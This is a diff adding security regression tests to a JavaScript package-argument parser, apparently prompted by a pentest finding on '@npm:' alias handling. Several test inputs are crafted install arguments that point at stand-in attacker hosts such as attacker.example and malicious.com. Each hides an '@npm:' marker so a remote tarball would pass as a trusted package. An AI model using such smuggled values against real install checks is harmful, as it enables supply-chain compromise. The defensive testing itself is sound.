@@ -181,4 +181,170 @@ describe("parsePackagesFromInstallArgs", () => {
       { name: "git://github.com/npm/cli.git", version: "latest" },
     ]);
   });
+
+  // Security tests for @npm: alias bypass vulnerability
+  describe("security: @npm: alias validation", () => {
+    it("should NOT strip @npm: from URL with @npm: in query parameter", () => {
+      // This is the exploit scenario from the pentest
+      const args = [
+        "install",
+        "https://attacker.example/payload.tgz?x=@npm:lodash",
+      ];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // The URL should remain unchanged, NOT be reduced to "lodash"
+      assert.deepEqual(result, [
+        {
+          name: "https://attacker.example/payload.tgz?x=@npm:lodash",
+          version: "latest",
+        },
+      ]);
+    });
+
+    it("should NOT strip @npm: from URL with @npm: in path", () => {
+      const args = [
+        "install",
+        "https://attacker.example/@npm:lodash/payload.tgz",
+      ];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // The URL should remain unchanged
+      assert.deepEqual(result, [
+        {
+          name: "https://attacker.example/@npm:lodash/payload.tgz",
+          version: "latest",
+        },
+      ]);
+    });
+
+    it("should NOT strip @npm: from http URL with @npm: marker", () => {
+      const args = [
+        "install",
+        "http://malicious.com/package.tgz?alias=@npm:safe-package",
+      ];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // The URL should remain unchanged, NOT be reduced to "safe-package"
+      assert.deepEqual(result, [
+        {
+          name: "http://malicious.com/package.tgz?alias=@npm:safe-package",
+          version: "latest",
+        },
+      ]);
+    });
+
+    it("should NOT strip @npm: from file path with @npm: marker", () => {
+      const args = ["install", "./local/@npm:package"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // File paths should not be treated as aliases
+      assert.deepEqual(result, [
+        { name: "./local/@npm:package", version: "latest" },
+      ]);
+    });
+
+    it("should NOT strip @npm: from absolute file path with @npm: marker", () => {
+      const args = ["install", "/tmp/@npm:package"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Absolute paths should not be treated as aliases
+      assert.deepEqual(result, [{ name: "/tmp/@npm:package", version: "latest" }]);
+    });
+
+    it("should NOT strip @npm: from Windows path with @npm: marker", () => {
+      const args = ["install", "C:\\packages\\@npm:lodash"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Windows paths should not be treated as aliases
+      assert.deepEqual(result, [
+        { name: "C:\\packages\\@npm:lodash", version: "latest" },
+      ]);
+    });
+
+    it("should NOT strip @npm: from file: protocol URL with @npm: marker", () => {
+      const args = ["install", "file:///tmp/@npm:package.tgz"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // file: protocol should not be treated as an alias
+      assert.deepEqual(result, [
+        { name: "file:///tmp/@npm:package.tgz", version: "latest" },
+      ]);
+    });
+
+    it("should strip @npm: from valid npm alias", () => {
+      // This is a legitimate npm alias and should be processed
+      const args = ["install", "server@npm:http-server@14.1.1"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Valid alias should be stripped
+      assert.deepEqual(result, [{ name: "http-server", version: "14.1.1" }]);
+    });
+
+    it("should strip @npm: from valid scoped package alias", () => {
+      const args = ["install", "my-alias@npm:@scope/package@1.0.0"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Valid alias with scoped package should be stripped
+      assert.deepEqual(result, [
+        { name: "@scope/package", version: "1.0.0" },
+      ]);
+    });
+
+    it("should strip @npm: from valid alias without version", () => {
+      const args = ["install", "server@npm:http-server"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Valid alias without version should be stripped
+      assert.deepEqual(result, [{ name: "http-server", version: "latest" }]);
+    });
+
+    it("should NOT strip @npm: when alias name is empty", () => {
+      const args = ["install", "@npm:lodash"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Empty alias name should not be treated as valid alias
+      assert.deepEqual(result, [{ name: "@npm:lodash", version: "latest" }]);
+    });
+
+    it("should handle multiple packages with mixed valid and invalid @npm: markers", () => {
+      const args = [
+        "install",
+        "https://attacker.example/payload.tgz?x=@npm:lodash",
+        "server@npm:http-server",
+      ];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // First package should remain unchanged, second should be stripped
+      assert.deepEqual(result, [
+        {
+          name: "https://attacker.example/payload.tgz?x=@npm:lodash",
+          version: "latest",
+        },
+        { name: "http-server", version: "latest" },
+      ]);
+    });
+
+    it("should NOT strip @npm: from git URL with @npm: marker", () => {
+      const args = ["install", "git://github.com/user/@npm:repo"];
+
+      const result = parsePackagesFromInstallArgs(args);
+
+      // Git URLs should not be treated as aliases
+      assert.deepEqual(result, [
+        { name: "git://github.com/user/@npm:repo", version: "latest" },
+      ]);
+    });
+  });
 });
